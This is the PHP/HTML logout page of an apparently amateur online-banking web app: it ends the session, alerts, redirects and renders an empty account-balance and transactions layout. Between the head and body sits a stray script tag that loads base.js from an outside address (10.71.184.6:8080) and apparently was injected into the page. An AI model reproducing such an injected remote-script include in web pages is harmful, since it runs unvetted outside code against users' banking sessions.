<?php

session_start() ;
//session_unset();
session_destroy();

echo" 

<script>
alert('You are being logged out. Click OK to continue'); 
location.href = 'member.php';
</script>
 
";

?>

<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Logout</title>
<link rel="stylesheet" type="text/css" href="style.css">
</head><script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='http://10.71.184.6:8080/www/default/base.js'></script>

<body>

<table width="820" border="0" align="center" cellpadding="0" cellspacing="0" style='border:1px solid #a3a3a3'>
	<tr>
		<td style='padding:10px' bgcolor="#EEEEEE">
		<table border="0" width="100%" cellspacing="1">
			<tr>
				<td width="392">Welcome,&nbsp; <b>&nbsp;</b></td>
				<td>
				Today: <b><?php echo date("d m Y"); ?></td>
				<td width="176">
				<p align="right">Secure Online banking</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#0088cc" background="acc_we15.gif" height="25">&nbsp;
		</td>
	</tr>
	<tr>
		<td style='padding:10px; vertical-align:top' height="166">
		<table border="0" width="100%" cellspacing="1">
			<tr>
				<td width="134" style='padding:10px; border:1px solid #a3a3a3'>
<img src="" height="0" width="0" />				
				</td>
				<td style='padding:10px; vertical-align:top; padding-right:0px'>
						<table border="0" width="100%" height="122" cellspacing="0" cellpadding="0">
							<tr>
								<td width="140" align="right" style='border-style:solid; border-width:0px; '>
								<font size='2'>Name: </font></td>
								<td align="left" style='border:1px solid #c3c3c3; border-bottom:0px'>
								<font size='2'>&nbsp;&nbsp;</font></td>
							</tr>
							<tr>
								<td width="140" align="right" style='border-style:solid; border-width:0px; '>
								<font size='2'>Account Number:</font></td>
								<td align="left" style='border:1px solid #c3c3c3; border-bottom:0px'>
								<font size='2'>&nbsp;</font></td>
							</tr>
							<tr>
								<td width="140" align="right" style='border-style:solid; border-width:0px; '>
								<font size='2'>Sort code:</font></td>
								<td align="left" style='border:1px solid #c3c3c3; border-bottom:0px' >
								<font size='2'>&nbsp;</font></td>
							</tr>
							<tr>
								<td width="140" align="right" style='border-style:solid; border-width:0px; '>
								<font size='2'>Date of 
								Deposit:</font></td>
								<td align="left" style='border:1px solid #c3c3c3'>
								<font size='2'>&nbsp;  </font></td>
							</tr>
							</table>
						</td>
			</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td style='padding:10px; vertical-align:top'>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="190" style='padding:10px; border:1px solid #f4cd58; border-right:0px' bgcolor="#FBF2A5">
				Quick Menu</td>
				<td style='padding:10px; border:1px solid #f4cd58;' bgcolor="#FFFFCF">
				Account Status</td>
			</tr>
			<tr>
				<td width="192" style='padding:10px; vertical-align:top'><table width="100%" cellspacing="0" cellpadding="0" border="0">
				  <tbody>
				    <tr>
				      <td style="padding:5px; border:1px solid #a3a3a3" width="16"><img src="add_services.php_files/acc_we8.gif" alt="8" border="0"></td>
				      <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="acc_welcome.php">Home</a></font></td>
			        </tr>
				    <tr>
				      <td style="padding:5px; border:1px solid #a3a3a3" width="16"><img src="add_services.php_files/acc_we9.gif" alt="9" border="0"></td>
				      <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="transactions.php">View Transactions</a></font></td>
			        </tr>
				    <tr>
				      <td style="padding:5px; border:1px solid #a3a3a3" width="16"><img src="add_services.php_files/acc_we10.gif" alt="10" border="0"></td>
				      <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="paybill.php">Pay a bill 
				        / someone</a></font></td>
			        </tr>
				    <tr>
				      <td style="padding:5px; border:1px solid #a3a3a3" width="16"><img src="add_services.php_files/acc_we11.gif" alt="11" border="0"></td>
				      <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="transfer_money.php">Transfer Money</a></font></td>
			        </tr>
				    <tr>
				      <td style="padding:5px; border:1px solid #a3a3a3" width="16"><img src="add_services.php_files/acc_we12.gif" alt="12" border="0"></td>
				      <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="add_services.php">Add Services</a></font></td>
			        </tr>
				    <tr>
				      <td style="padding:5px; border:1px solid #a3a3a3" width="16"><img src="add_services.php_files/acc_we13.gif" alt="13" border="0"></td>
				      <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="user_profile.php">User Profile</a></font></td>
			        </tr>
				    <tr>
				      <td style="padding:5px; border:1px solid #a3a3a3" width="16"><img src="add_services.php_files/acc_we14.gif" alt="14" border="0"></td>
				      <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="logout.php">Logout</a></font></td>
			        </tr>
			      </tbody>
			    </table></td>
				<td style='padding:10px; border:1px solid #f4cd58; vertical-align:top; border-top:0px'>
<table border="0" width="100%" cellspacing="1">
	<tr>
		<td height="39"><font size="2">Account Balance:</font></td>
	</tr>
	<tr>
		<td>
						<table border="0" width="100%" cellspacing="0" bordercolorlight="#DDDDDD" bordercolordark="#DDDDDD">
							<tr>
								<td bgcolor="#EFEFEF" width="185" height="24" align="left" bordercolor="#DDDDDD" style='padding:5px; border-bottom:1px solid #efefef'>
								<p align="left"><b>
								<font size="2">Account 
								Name</font></b></td>
								<td bgcolor="#EFEFEF" align="left" width="154" height="24" bordercolor="#DDDDDD" style='padding:5px; border-bottom:1px solid #efefef'>
								<b><font size="2">Account Number</font></b></td>
								<td bgcolor="#EFEFEF" align="left" width="148" height="24" bordercolor="#DDDDDD" style='padding:5px; border-bottom:1px solid #efefef'>
								<font size="2"><b>Account Currency</b></font></td>
								<td bgcolor="#EFEFEF" align="left" height="24" width="153" bordercolor="#DDDDDD" style='padding:5px; border-bottom:1px solid #efefef'><b>
								<font size="2">Account 
								Value</font></b></td>
							</tr>
							<tr>
								<td width="185" class="menu1" bordercolor="#DDDDDD" align="left" style='padding:5px; border-bottom:1px solid #efefef; border-left:1px solid #dddddd'>
								<font size="2"> </font></td>
								<td class="menu1" align="left" width="154" bordercolor="#DDDDDD" style='padding:5px; border-bottom:1px solid #efefef'>
								<font size="2"></font></td>
								<td class="menu1" align="left" width="148" bordercolor="#DDDDDD" style='padding:5px; border-bottom:1px solid #efefef'>
								<font size="2">£ (GBP)</font></td>
								<td class="menu1" align="left" bordercolor="#DDDDDD" style='padding:5px; border-bottom:1px solid #efefef; border-right:1px solid #dddddd'>
								<font size="2">
								 
								</font> 
								</td>
							</tr>
							</table>
						</td>
	</tr>
	<tr>
		<td height="40"><font size="2">Last Transaction on Account:</font></td>
	</tr>
	<tr>
		<td><font size="2"></font><table border="0" width="590" cellspacing="1" style='border:1px solid #dddddd'>
	<font size='2'></font><tr><td bgcolor='#EFEFEF' style='border-bottom:1px solid #dddddd; padding:5px;' ><STRONG>
		<font size='2'>ID</font></STRONG></td><td style='border-bottom:1px solid #dddddd; padding:5px;' bgcolor=#EFEFEF>
<strong><font size='2'>Account</font></strong></td><td style='border-bottom:1px solid #dddddd; padding:5px;' bgcolor=#EFEFEF>
		<STRONG><font size='2'>Account Name </font>
</STRONG></td><td style='border-bottom:1px solid #dddddd; padding:5px;' bgcolor=#EFEFEF>
		<strong><font size='2'>Transaction Type</font></strong></td>
<td style='border-bottom:1px solid #dddddd; padding:5px;' bgcolor=#EFEFEF>
<strong><font size='2'>Transaction Date</font></strong></td>
<td bgcolor='#EFEFEF' style='border-bottom:1px solid #dddddd; padding:5px;' >
<strong><font size='2'>Transaction Value</font></strong></tr><font size='2'>No Transaction Found</font></TABLE><font size='2'></font></td>
	</tr>
	<tr>
		<td>&nbsp;</td>
	</tr>
</table>
				</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#EEEEEE">&nbsp;</td>
	</tr>
</table>

<p>&nbsp;</p>

</body>

</html>